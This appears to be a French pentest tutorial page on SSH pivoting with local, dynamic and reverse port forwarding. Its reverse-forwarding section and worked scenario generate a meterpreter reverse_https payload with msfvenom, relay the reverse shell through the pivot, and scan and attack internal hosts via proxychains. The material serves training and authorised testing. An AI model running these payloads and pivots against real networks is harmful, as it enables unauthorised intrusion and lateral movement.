# Tunnels SSH et port forwarding

SSH est l'outil de pivoting le plus utilise en pentest. Il permet trois types de redirection de ports : le local port forwarding (rediriger un port distant vers notre machine), le dynamic port forwarding (creer un proxy SOCKS pour scanner tout un reseau) et le remote/reverse port forwarding (rediriger un port local vers un hote distant, utile pour recevoir des reverse shells).

## Pourquoi

SSH est presque toujours disponible sur les serveurs Linux compromis. Il ne necessite aucune installation supplementaire et le trafic est chiffre nativement. C'est le premier reflexe pour etablir un tunnel quand on dispose d'un acces SSH sur un pivot host.

## Comment ca marche

### Local port forwarding (`-L`)

Redirige un port d'un service distant vers un port local sur notre machine d'attaque. Utile pour acceder a un service qui n'ecoute que sur localhost du pivot (MySQL, Redis, etc.).

```bash
# - Rediriger le port MySQL distant vers notre port local 1234
ssh -L 1234:localhost:3306 user@<IP_PIVOT>
```

Apres connexion, le service MySQL du pivot est accessible localement :

```bash
# - Se connecter au MySQL via le tunnel
mysql -h 127.0.0.1 -P 1234 -u root
```

On peut rediriger plusieurs ports en une seule commande :

```bash
# - Rediriger MySQL ET le serveur web
ssh -L 1234:localhost:3306 -L 8080:localhost:80 user@<IP_PIVOT>
```

{% hint style="info" %}
Le local port forwarding permet aussi d'atteindre des services sur le reseau interne depuis le pivot. La syntaxe `ssh -L 1234:172.16.5.19:3389 user@pivot` redirige le port RDP d'une machine interne vers notre port local 1234.
{% endhint %}

### Dynamic port forwarding (`-D`) et SOCKS

Le dynamic port forwarding cree un proxy SOCKS sur notre machine locale. Tout le trafic envoye a travers ce proxy est encapsule dans SSH et route via le pivot host. C'est la methode la plus polyvalente pour scanner et interagir avec un reseau interne entier.

```bash
# - Creer un proxy SOCKS sur le port 9050
ssh -D 9050 user@<IP_PIVOT>
```

#### Configuration de proxychains

Ajouter ou verifier la ligne suivante dans `/etc/proxychains.conf` :

```
socks4 127.0.0.1 9050
```

#### Utilisation avec Nmap

```bash
# - Scanner un hote interne via le proxy SOCKS
proxychains nmap -sT -Pn -v 172.16.5.19
```

{% hint style="warning" %}
Avec proxychains, seuls les scans TCP complets (`-sT`) fonctionnent. Pas de scan SYN (`-sS`), pas de scan UDP, pas de ping ICMP. Ajouter `-Pn` pour desactiver la decouverte d'hote (qui utilise ICMP).
{% endhint %}

#### Utilisation avec d'autres outils

```bash
# - RDP via le proxy
proxychains xfreerdp /v:172.16.5.19 /u:utilisateur /p:motdepasse

# - Metasploit via le proxy
proxychains msfconsole

# - CrackMapExec via le proxy
proxychains crackmapexec smb 172.16.5.0/24
```

### Remote/Reverse port forwarding (`-R`)

Le reverse port forwarding resout le probleme suivant : comment recevoir un reverse shell d'un hote interne qui ne peut pas joindre directement notre machine d'attaque ?

Le flux est : la cible interne envoie son reverse shell au pivot host, et le pivot host redirige ce trafic vers notre machine d'attaque via le tunnel SSH.

```bash
# - Le pivot ecoute sur 8080 et redirige vers notre listener sur 8000
ssh -R 172.16.5.129:8080:0.0.0.0:8000 user@<IP_PIVOT> -vN
```

**Workflow complet :**

```bash
# 1 - Sur notre machine : preparer le listener
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run

# 2 - Generer le payload (LHOST = IP interne du pivot)
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=172.16.5.129 LPORT=8080 -f exe -o shell.exe

# 3 - Etablir le reverse port forwarding
ssh -R 172.16.5.129:8080:0.0.0.0:8000 user@<IP_PIVOT> -vN

# 4 - Transferer et executer le payload sur la cible interne
```

{% hint style="success" %}
Le flag `-vN` est utile pour le reverse port forwarding : `-v` active le mode verbose (on voit les connexions relayees dans les logs), `-N` indique qu'on ne veut pas de shell interactif (juste le tunnel).
{% endhint %}

## En pratique

```bash
# Scenario : pivot Linux avec SSH, cible Windows sur le reseau interne

# 1 - Connexion SSH avec dynamic port forwarding
ssh -D 9050 ubuntu@<IP_PIVOT>

# 2 - Verifier les interfaces du pivot
ifconfig  # noter les sous-reseaux accessibles

# 3 - Scanner le reseau interne
proxychains nmap -sT -Pn 172.16.5.1-254 -p 22,80,445,3389

# 4 - RDP vers une cible decouverte
proxychains xfreerdp /v:172.16.5.19 /u:user /p:password

# 5 - Si besoin d'un reverse shell depuis la cible interne
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<IP_PIVOT> -vN
```

## Pieges et galeres

{% tabs %}
{% tab title="Proxychains" %}
- **Timeout sur les scans larges** : scanner un /24 complet via proxychains prend des heures. Cibler les hotes connus ou les ports specifiques
- **DNS leaks** : par defaut, proxychains peut laisser fuiter les requetes DNS. Activer `proxy_dns` dans la configuration pour forcer la resolution DNS via le proxy
- **Version SOCKS** : certains outils necessitent SOCKS5 au lieu de SOCKS4. Adapter la configuration de proxychains en consequence
{% endtab %}
{% tab title="SSH" %}
- **AllowTcpForwarding** : si cette option est desactivee dans la configuration SSH du serveur, le port forwarding est bloque. Verifier avec `sshd_config`
- **GatewayPorts** : pour que le reverse port forwarding ecoute sur toutes les interfaces (pas seulement localhost), cette option doit etre activee sur le serveur SSH
- **Connexion SSH qui tombe** : ajouter `-o ServerAliveInterval=60` pour maintenir la connexion active. En environnement instable, utiliser `autossh`
{% endtab %}
{% endtabs %}

## Retour terrain

Le tunnel SSH dynamique (`-D`) est le couteau suisse du pivoting. En 10 secondes, on a un proxy SOCKS fonctionnel qui permet de router n'importe quel outil compatible TCP vers le reseau interne. La combinaison `ssh -D 9050` + `proxychains` couvre 90% des besoins de pivoting.

Le reverse port forwarding (`-R`) est moins intuitif mais indispensable pour recevoir des reverse shells depuis des hotes internes. Le schema mental a retenir : le payload pointe vers le pivot (son IP interne), le tunnel SSH redirige du pivot vers notre listener.

## Memo express

| Technique | Commande | Usage |
|---|---|---|
| Local forward | `ssh -L 1234:localhost:3306 user@pivot` | Acceder a un service distant localement |
| Dynamic forward | `ssh -D 9050 user@pivot` | Proxy SOCKS pour tout le reseau |
| Reverse forward | `ssh -R pivot_ip:8080:0.0.0.0:8000 user@pivot -vN` | Recevoir un reverse shell via le pivot |
| Multi-ports | `ssh -L 1234:...:3306 -L 8080:...:80 user@pivot` | Rediriger plusieurs services |
| Nmap via proxy | `proxychains nmap -sT -Pn <cible>` | Scanner a travers le tunnel |
| RDP via proxy | `proxychains xfreerdp /v:<cible> /u:user /p:pass` | Bureau distant via le tunnel |

***
